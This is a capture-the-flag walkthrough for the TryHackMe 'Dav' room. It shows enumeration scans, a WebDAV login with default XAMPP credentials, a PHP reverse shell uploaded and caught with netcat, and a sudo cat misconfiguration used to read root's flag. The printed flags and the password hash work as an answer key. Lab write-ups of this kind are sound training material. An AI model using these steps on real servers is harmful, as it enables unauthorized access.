# Dav

boot2root machine for FIT and bsides guatemala CTF

[Dav](https://tryhackme.com/room/bsidesgtdav)

## Topic's

- Network Enumeration
- Web Enumeration
- Security Misconfiguration
- WebDav Enumeration
- Misconfigured Binaries

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Dav

Read user.txt and root.txt

```
kali@kali:~/CTFs/tryhackme/Dav$ sudo nmap -A -sS -sC -sV -O 10.10.216.70
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 16:09 CEST
Nmap scan report for 10.10.216.70
Host is up (0.046s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/14%OT=80%CT=1%CU=43441%PV=Y%DS=2%DC=T%G=Y%TM=5F8706
OS:A3%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10E%TI=Z%CI=I%TS=8)OPS(O1=M
OS:508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%
OS:O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%
OS:DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=
OS:0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF
OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=
OS:%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%
OS:IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 23/tcp)
HOP RTT      ADDRESS
1   37.00 ms 10.8.0.1
2   37.62 ms 10.10.216.70

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.92 seconds
```

```
kali@kali:~/CTFs/tryhackme/Dav$ /opt/dirsearch/dirsearch.py -u 10.10.216.70 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -e html,php

  _|. _ _  _  _  _ _|_    v0.4.0
 (_||| _) (/_(_|| (_| )

Extensions: html, php | HTTP method: GET | Threads: 20 | Wordlist size: 4658
Traceback (most recent call last):
  File "/opt/dirsearch/dirsearch.py", line 46, in <module>
    main = Program()
  File "/opt/dirsearch/dirsearch.py", line 42, in __init__
    self.controller = Controller(self.script_path, self.arguments, self.output)
  File "/opt/dirsearch/lib/controller/Controller.py", line 134, in __init__
    self.setupErrorLogs()
  File "/opt/dirsearch/lib/controller/Controller.py", line 311, in setupErrorLogs
    self.errorLog = open(self.errorLogPath, "w")
PermissionError: [Errno 13] Permission denied: '/opt/dirsearch/logs/errors-20-10-14_16-11-20.log'
kali@kali:~/CTFs/tryhackme/Dav$ sudo /opt/dirsearch/dirsearch.py -u 10.10.216.70 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -e html,php

  _|. _ _  _  _  _ _|_    v0.4.0
 (_||| _) (/_(_|| (_| )

Extensions: html, php | HTTP method: GET | Threads: 20 | Wordlist size: 4658

Error Log: /opt/dirsearch/logs/errors-20-10-14_16-11-26.log

Target: 10.10.216.70

Output File: /opt/dirsearch/reports/10.10.216.70/_20-10-14_16-11-26.txt

[16:11:26] Starting:
[16:11:32] 200 -   11KB - /index.html
[16:11:36] 403 -  300B  - /server-status
[16:11:38] 401 -  459B  - /webdav

Task Completed
```

[http://10.10.216.70/webdav](http://10.10.216.70/webdav)

[http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html](http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html)

```
cadaver http://<REMOTE HOST>/webdav/
user: wampp
pass: xampp
```

[http://10.10.216.70/webdav/passwd.dav](http://10.10.216.70/webdav/passwd.dav)

`wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91`

```
kali@kali:~/CTFs/tryhackme/Dav$ cadaver http://10.10.216.70/webdav/
Authentication required for webdav on server `10.10.216.70':
Username: wampp
Password:
dav:/webdav/> put php-reverse-shell.php
Uploading php-reverse-shell.php to `/webdav/php-reverse-shell.php':
Progress: [=============================>] 100.0% of 5494 bytes succeeded.
dav:/webdav/> quit
Connection to `10.10.216.70' closed.
```

`http://10.10.216.70/webdav/php-reverse-shell.php`

```
kali@kali:~/CTFs/tryhackme/Dav$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.216.70] 40106
Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 07:16:52 up 10 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ SHELL=/bin/bash script -q /dev/null
www-data@ubuntu:/$ cd /home
cd /home
www-data@ubuntu:/home$ ls
ls
merlin  wampp
www-data@ubuntu:/home$ cd /home/merlin/
cd /home/merlin/
www-data@ubuntu:/home/merlin$ ls -la
ls -la
total 44
drwxr-xr-x 4 merlin merlin 4096 Aug 25  2019 .
drwxr-xr-x 4 root   root   4096 Aug 25  2019 ..
-rw------- 1 merlin merlin 2377 Aug 25  2019 .bash_history
-rw-r--r-- 1 merlin merlin  220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 merlin merlin 3771 Aug 25  2019 .bashrc
drwx------ 2 merlin merlin 4096 Aug 25  2019 .cache
-rw------- 1 merlin merlin   68 Aug 25  2019 .lesshst
drwxrwxr-x 2 merlin merlin 4096 Aug 25  2019 .nano
-rw-r--r-- 1 merlin merlin  655 Aug 25  2019 .profile
-rw-r--r-- 1 merlin merlin    0 Aug 25  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root   root    183 Aug 25  2019 .wget-hsts
-rw-rw-r-- 1 merlin merlin   33 Aug 25  2019 user.txt
www-data@ubuntu:/home/merlin$ cat user.txt
cat user.txt
449b40fe93f78a938523b7e4dcd66d2a

www-data@ubuntu:/home/merlin$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
www-data@ubuntu:/home/merlin$ sudo cat /root/root.txt
sudo cat /root/root.txt
101101ddc16b0cdf65ba0b8a7af7afa5
```

1. user.txt

`449b40fe93f78a938523b7e4dcd66d2a`

2. root.txt

`101101ddc16b0cdf65ba0b8a7af7afa5`
